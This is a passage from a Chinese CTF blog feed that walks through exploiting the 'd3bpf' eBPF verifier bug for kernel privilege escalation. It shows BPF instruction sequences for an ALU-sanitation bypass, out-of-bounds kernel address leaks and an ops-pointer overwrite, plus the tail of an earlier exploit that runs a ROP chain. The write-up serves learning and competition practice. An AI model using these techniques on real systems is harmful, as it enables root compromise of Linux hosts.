BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>),</span><br><span class="line">            BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),</span><br><span class="line">            BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-8</span>),</span><br><span class="line">            BPF_MOV64_IMM(BPF_REG_4, <span class="number">8</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_ADD, BPF_REG_4, EXP_REG),</span><br><span class="line">            BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_skb_load_bytes),</span><br><span class="line">            BPF_EXIT_INSN()&#125;;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(attack_insn, <span class="keyword">sizeof</span>(attack_insn) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="literal">NULL</span>, rop_chain, <span class="number">0x100</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230111180153062.png"                      alt="image-20230111180153062"                ></p><p>首先运行exp触发<code>soft panic</code>可以看到在其中存在酷似kernel代码段的地址信息，所以我们可以通过计算得到<code>kernel_offset</code></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230111180450710.png"                      alt="image-20230111180450710"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230111180529651.png"                      alt="image-20230111180529651"                ></p><p>最后成功提权。</p><hr><p>题目放在:<a class="link"   href="https://github.com/196082/196082/blob/main/kernel_pwn/d3bpf-v2.zip" >https://github.com/196082/196082/blob/main/kernel_pwn/d3bpf-v2.zip<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;因为近期一直在玩内核，在把这篇文章写完之后就不会一直更新内核相关的了，后续的打算是学习完逃逸的内容之后就开始进行刷题和复现比赛的练习了。&lt;/p&gt;
&lt;h2 id=&quot;分析题目&quot;&gt;&lt;a href=&quot;#分析题目&quot; class=&quot;headerlink&quot; title=&quot;分析题目&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="ebpf" scheme="https://cv196082.gitee.io/tags/ebpf/"/>
    
  </entry>
  
  <entry>
    <title>d3bpf</title>
    <link href="https://cv196082.gitee.io/2023/01/06/d3bpf/"/>
    <id>https://cv196082.gitee.io/2023/01/06/d3bpf/</id>
    <published>2023-01-06T11:55:01.000Z</published>
    <updated>2023-01-06T11:55:39.052Z</updated>
    
    <content type="html"><![CDATA[<p>虽然在之前出过几篇关于bpf的文章，但是我并没有得到很深层次的理解，文章的exp基本就是copy的。并且，D3^CTF 2022还有两道ebpf需要复现，所以现在就选择了复现一下。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/fs/fs_context.c b/fs/fs_context.c</span><br><span class="line">index <span class="number">2834</span>d1afa.<span class="number">.0</span>a79c9099 <span class="number">100644</span></span><br><span class="line">--- a/fs/fs_context.c</span><br><span class="line">+++ b/fs/fs_context.c</span><br><span class="line">@@ <span class="number">-530</span>,<span class="number">7</span> +<span class="number">530</span>,<span class="number">7</span> @@ <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">legacy_parse_param</span><span class="params">(struct fs_context *fc, struct fs_parameter *param)</span></span></span><br><span class="line"><span class="function">       param-&gt;key)</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">-<span class="keyword">if</span> (len &gt; PAGE_SIZE - <span class="number">2</span> - size)</span><br><span class="line">+<span class="keyword">if</span> (size + len + <span class="number">2</span> &gt; PAGE_SIZE) <span class="comment">// patch for CVE-2022-0185</span></span><br><span class="line"> <span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Cumulative options too large&quot;</span>);</span><br><span class="line"> <span class="keyword">if</span> (<span class="built_in">strchr</span>(param-&gt;key, <span class="string">&#x27;,&#x27;</span>) ||</span><br><span class="line">     (param-&gt;type == fs_value_is_string &amp;&amp;</span><br><span class="line">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c</span><br><span class="line">index <span class="number">37581919</span>e.<span class="number">.8e98</span>d4af5 <span class="number">100644</span></span><br><span class="line">--- a/kernel/bpf/verifier.c</span><br><span class="line">+++ b/kernel/bpf/verifier.c</span><br><span class="line">@@ <span class="number">-6455</span>,<span class="number">11</span> +<span class="number">6455</span>,<span class="number">11</span> @@ <span class="keyword">static</span> <span class="keyword">int</span> adjust_scalar_min_max_vals(struct bpf_verifier_env *env,</span><br><span class="line"> scalar_min_max_lsh(dst_reg, &amp;src_reg);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> BPF_RSH:</span><br><span class="line">-<span class="keyword">if</span> (umax_val &gt;= insn_bitness) &#123;</span><br><span class="line">-<span class="comment">/* Shifts greater than 31 or 63 are undefined.</span></span><br><span class="line"><span class="comment">- * This includes shifts by a negative number.</span></span><br><span class="line"><span class="comment">- */</span></span><br><span class="line">-mark_reg_unknown(env, regs, insn-&gt;dst_reg);</span><br><span class="line">+<span class="keyword">if</span> (umin_val &gt;= insn_bitness) &#123;</span><br><span class="line">+<span class="keyword">if</span> (alu32)</span><br><span class="line">+__mark_reg32_known(dst_reg, <span class="number">0</span>);</span><br><span class="line">+<span class="keyword">else</span></span><br><span class="line">+__mark_reg_known_zero(dst_reg);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span> (alu32)</span><br><span class="line">diff --git a/net/packet/af_packet.c b/net/packet/af_packet.c</span><br><span class="line">index <span class="number">6b</span>bc7a448..d949fdf00 <span class="number">100644</span></span><br><span class="line">--- a/net/packet/af_packet.c</span><br><span class="line">+++ b/net/packet/af_packet.c</span><br><span class="line">@@ <span class="number">-4448</span>,<span class="number">9</span> +<span class="number">4448</span>,<span class="number">10</span> @@ <span class="keyword">static</span> <span class="keyword">int</span> packet_set_ring(struct sock *sk, <span class="keyword">union</span> tpacket_req_u *req_u,</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> out_free_pg_vec:</span><br><span class="line">-bitmap_free(rx_owner_map);</span><br><span class="line">-<span class="keyword">if</span> (pg_vec)</span><br><span class="line">+<span class="keyword">if</span> (pg_vec) &#123;</span><br><span class="line">+bitmap_free(rx_owner_map); <span class="comment">// patch for CVE-2021-22600</span></span><br><span class="line"> free_pg_vec(pg_vec, order, req-&gt;tp_block_nr);</span><br><span class="line">+&#125;</span><br><span class="line"> out:</span><br><span class="line"> <span class="keyword">return</span> err;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目拿到手之后是一个diff文件，在文件最上面有一个patch是为了修复<code>CVE-2022-0185</code>，在文件的最下面是一个patch，也明说了就是为了修复<code>CVE-2021-22600</code>，不过上面还有一段修改。</p><p>上面将原本的语句删除了，并且添加了几条语句。原本的语句中的，在进行RSH时，如果超过31或则63则将寄存器设置为unkown。但是在修改过后的语句中如果超过了63或者31不是设置为unknown而是默认设置为0。</p><p>这里因为架构的原因，如果我们使用右移64位得到的结果为1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x 1 &gt;&gt; 64</span><br><span class="line"><span class="variable">$3</span> = 0x1</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>所以题目这里给的漏洞为，在verifier为0但是在runtime为1的寄存器。</p><p>观察题目的启动命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -m 128M \</span><br><span class="line">  -kernel bzImage \</span><br><span class="line">  -initrd rootfs.cpio \</span><br><span class="line">  -append <span class="string">&#x27;console=ttyS0 kaslr quiet&#x27;</span> \</span><br><span class="line">  -monitor /dev/null \</span><br><span class="line">  -cpu kvm64,+smep,+smap \</span><br><span class="line">  -smp cores=1,threads=1 \</span><br><span class="line">  -nographic \</span><br><span class="line">  -s</span><br></pre></td></tr></table></figure><p>基本上能开的都开了，启动虚拟机也可以查看，其实kpti也是打开了的。</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><h3 id="泄漏"><a href="#泄漏" class="headerlink" title="泄漏"></a>泄漏</h3><p>因为我们现在有一个verifier为0，runtime为1的寄存器所以我们可以尝试越界读来造成泄漏，首先就需要认识<code>bpf_map</code>结构体:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> &#123;</span></span><br><span class="line"><span class="comment">/* The first two cachelines with read-mostly members of which some</span></span><br><span class="line"><span class="comment"> * are also accessed in fast-path (e.g. ops, max_entries).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops</span> ____<span class="title">cacheline_aligned</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">inner_map_meta</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">void</span> *security;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">bpf_map_type</span> <span class="title">map_type</span>;</span></span><br><span class="line">u32 key_size;</span><br><span class="line">u32 value_size;</span><br><span class="line">u32 max_entries;</span><br><span class="line">u32 map_flags;</span><br><span class="line"><span class="keyword">int</span> spin_lock_off; <span class="comment">/* &gt;=0 valid offset, &lt;0 error */</span></span><br><span class="line">u32 id;</span><br><span class="line"><span class="keyword">int</span> numa_node;</span><br><span class="line">u32 btf_key_type_id;</span><br><span class="line">u32 btf_value_type_id;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">btf</span> *<span class="title">btf</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG_KMEM</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">u32 btf_vmlinux_value_type_id;</span><br><span class="line"><span class="keyword">bool</span> bypass_spec_v1;</span><br><span class="line"><span class="keyword">bool</span> frozen; <span class="comment">/* write-once; write-protected by freeze_mutex */</span></span><br><span class="line"><span class="comment">/* 22 bytes hole */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The 3rd and 4th cacheline with misc members to avoid false sharing</span></span><br><span class="line"><span class="comment"> * particularly with refcounting.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">atomic64_t</span> refcnt ____cacheline_aligned;</span><br><span class="line"><span class="keyword">atomic64_t</span> usercnt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">freeze_mutex</span>;</span></span><br><span class="line">u64 writecnt; <span class="comment">/* writable mmap cnt; protected by freeze_mutex */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果我们在开始定义类型为<code>BPF_MAP_TYPE_ARRAY</code>那么结构体如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_array</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> <span class="title">map</span>;</span></span><br><span class="line">u32 elem_size;</span><br><span class="line">u32 index_mask;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_array_aux</span> *<span class="title">aux</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> value[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">void</span> *ptrs[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">void</span> __percpu *pptrs[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到在上面的<code>bpf_map</code>结构体的开始位置有一个ops指针，而根据以往的经验ops中包含了很多内核函数的指针，当然事实也正如此</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> <span class="title">array_map_ops</span> =</span> &#123;</span><br><span class="line">.map_meta_equal = array_map_meta_equal,</span><br><span class="line">.map_alloc_check = array_map_alloc_check,</span><br><span class="line">.map_alloc = array_map_alloc,</span><br><span class="line">.map_free = array_map_free,</span><br><span class="line">.map_get_next_key = array_map_get_next_key,</span><br><span class="line">.map_lookup_elem = array_map_lookup_elem,</span><br><span class="line">.map_update_elem = array_map_update_elem,</span><br><span class="line">.map_delete_elem = array_map_delete_elem,</span><br><span class="line">.map_gen_lookup = array_map_gen_lookup,</span><br><span class="line">.map_direct_value_addr = array_map_direct_value_addr,</span><br><span class="line">.map_direct_value_meta = array_map_direct_value_meta,</span><br><span class="line">.map_mmap = array_map_mmap,</span><br><span class="line">.map_seq_show_elem = array_map_seq_show_elem,</span><br><span class="line">.map_check_btf = array_map_check_btf,</span><br><span class="line">.map_lookup_batch = generic_map_lookup_batch,</span><br><span class="line">.map_update_batch = generic_map_update_batch,</span><br><span class="line">.map_btf_name = <span class="string">&quot;bpf_array&quot;</span>,</span><br><span class="line">.map_btf_id = &amp;array_map_btf_id,</span><br><span class="line">.iter_seq_info = &amp;iter_seq_info,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因为我们上面所选择的类型为数组，所以这里ops会包含<code>array_map_ops</code>指针，所以我们可以利用它来泄漏内核地址。</p><p>如果我们使用<code>BPF_FUNC_map_lookup_elem</code>来进行函数调用的话，根据上述ops我们最终会调用到<code>array_map_lookup_elem</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Called from syscall or from eBPF program */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">array_map_lookup_elem</span><span class="params">(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_array</span> *<span class="title">array</span> =</span> container_of(<span class="built_in">map</span>, struct bpf_array, <span class="built_in">map</span>);</span><br><span class="line">u32 index = *(u32 *)key;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(index &gt;= <span class="built_in">array</span>-&gt;<span class="built_in">map</span>.max_entries))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">array</span>-&gt;value + <span class="built_in">array</span>-&gt;elem_size * (index &amp; <span class="built_in">array</span>-&gt;index_mask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的注释也说明了，这里允许被syscall以及eBPF程序调用。而这里程序的返回内容则是<code>map_ptr.value</code>所以可以根据这里的偏移得出返回内容为<code>map_ptr+0x110</code>的地址。</p><p>可能到这里大家都应该有一定的思路了，不过这里还存在一个检测<code>ALU Sanitation</code>，在这个检测中<code>alu_limit</code>表示操作允许最大值，这里做限制的主要目的是防止通过ebpf程序调用出现越界或访问不属于他自己的地址区域时所做的限制，如果我们<code>src_reg</code>的值大于<code>alu_limit</code>或者与之符号相反，那么<code>src_reg</code>会被强制制为0，导致指针运算失败。不过在这里绕过的方式也比较简单。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV64_REG(BPF_REG_0, EXP_REG),</span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, OOB_REG, <span class="number">0x1000</span>),</span><br><span class="line">BPF_ALU64_IMM(BPF_MUL, BPF_REG_0, <span class="number">0x1000</span> - <span class="number">1</span>),</span><br><span class="line">BPF_ALU64_REG(BPF_SUB, OOB_REG, BPF_REG_0),</span><br><span class="line">BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br></pre></td></tr></table></figure><p>因为这里存在一个verifier为0的寄存器<code>EXP_REG</code>那么我们如果进行上述代码中的操作即可是的<code>alm_limit</code>为<code>0x1000</code></p><p>那么在做完上文中所有操作之后可以正式进入泄漏阶段了，其实有了上述思路，这里泄漏起来就比较简单了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BPF_ALU64_IMM(BPF_MUL, EXP_REG, <span class="number">0x110</span>),</span><br><span class="line">BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br><span class="line">BPF_LDX_MEM(BPF_DW, BPF_REG_0, OOB_REG, <span class="number">0</span>),</span><br><span class="line">BPF_STX_MEM(BPF_DW, STORE_REG, BPF_REG_0, <span class="number">8</span>),</span><br><span class="line">BPF_EXIT_INSN(),</span><br></pre></td></tr></table></figure><p>只需要将<code>oob_map</code>的<code>array_map_ops</code>放到<code>store_map</code>的value中去即可。并且在<code>bpf_map</code>中存在一个成员work是一个双向链表的结构，其中存在一个地址指向自己，这样我们即可获取<code>oob_map</code>的地址了。</p><p>不过在实际做的过程中会发现上述利用方式会存在许多问题，达不到真正意义上的任意内存读，这里我忘记了具体原因，应该是会检测寄存器的值不能为堆栈以外的地址，所以还需要利用一个新的办法，<code>obj_get_info_by_fd</code>函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_map_get_info_by_fd</span><span class="params">(struct file *file,</span></span></span><br><span class="line"><span class="params"><span class="function">  struct bpf_map *<span class="built_in">map</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">const</span> <span class="keyword">union</span> bpf_attr *attr,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">union</span> bpf_attr __user *uattr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info</span> __<span class="title">user</span> *<span class="title">uinfo</span> =</span> u64_to_user_ptr(attr-&gt;info.info);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info</span> <span class="title">info</span>;</span></span><br><span class="line">u32 info_len = attr-&gt;info.info_len;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">err = bpf_check_uarg_tail_zero(uinfo, <span class="keyword">sizeof</span>(info), info_len);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">info_len = <span class="keyword">min_t</span>(u32, <span class="keyword">sizeof</span>(info), info_len);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;info, <span class="number">0</span>, <span class="keyword">sizeof</span>(info));</span><br><span class="line">info.type = <span class="built_in">map</span>-&gt;map_type;</span><br><span class="line">info.id = <span class="built_in">map</span>-&gt;id;</span><br><span class="line">info.key_size = <span class="built_in">map</span>-&gt;key_size;</span><br><span class="line">info.value_size = <span class="built_in">map</span>-&gt;value_size;</span><br><span class="line">info.max_entries = <span class="built_in">map</span>-&gt;max_entries;</span><br><span class="line">info.map_flags = <span class="built_in">map</span>-&gt;map_flags;</span><br><span class="line"><span class="built_in">memcpy</span>(info.name, <span class="built_in">map</span>-&gt;name, <span class="keyword">sizeof</span>(<span class="built_in">map</span>-&gt;name));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">map</span>-&gt;btf) &#123;</span><br><span class="line">info.btf_id = btf_obj_id(<span class="built_in">map</span>-&gt;btf);</span><br><span class="line">info.btf_key_type_id = <span class="built_in">map</span>-&gt;btf_key_type_id;</span><br><span class="line">info.btf_value_type_id = <span class="built_in">map</span>-&gt;btf_value_type_id;</span><br><span class="line">&#125;</span><br><span class="line">info.btf_vmlinux_value_type_id = <span class="built_in">map</span>-&gt;btf_vmlinux_value_type_id;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bpf_map_is_dev_bound(<span class="built_in">map</span>)) &#123;</span><br><span class="line">err = bpf_map_offload_info_fill(&amp;info, <span class="built_in">map</span>);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (copy_to_user(uinfo, &amp;info, info_len) ||</span><br><span class="line">    put_user(info_len, &amp;uattr-&gt;info.info_len))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">u32 <span class="title">btf_obj_id</span><span class="params">(<span class="keyword">const</span> struct btf *btf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> btf-&gt;id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以如果我们控制<code>bpf_map</code>结构体中的btf即可实现真正意义上的任意地址泄漏。</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>其实这里的提权方式可能大家都能想到，因为在<code>bpf_map</code>结构体中存在一个结构体为ops，而我们在以往的kernel题目中利用的比较多的就是这个ops，所以这里同样可以这样使用。</p><p>这里选择的最终利用函数是前面提到过的<code>work_for_cpu_fn</code>函数。过程就是，首先我们需要先泄漏出当前ops结构体中的所有函数地址，随后将函数地址中<code>map_get_next_key</code>函数所在位置的指针替换为<code>work_for_cpu_fn</code>，紧接着写入到<code>oob_map</code>的value中去。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_get_next_key</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> __user *ukey = u64_to_user_ptr(attr-&gt;key);</span><br><span class="line"><span class="keyword">void</span> __user *unext_key = u64_to_user_ptr(attr-&gt;next_key);</span><br><span class="line"><span class="keyword">int</span> ufd = attr-&gt;map_fd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line"><span class="keyword">void</span> *key, *next_key;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CHECK_ATTR(BPF_MAP_GET_NEXT_KEY))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">f = fdget(ufd);</span><br><span class="line"><span 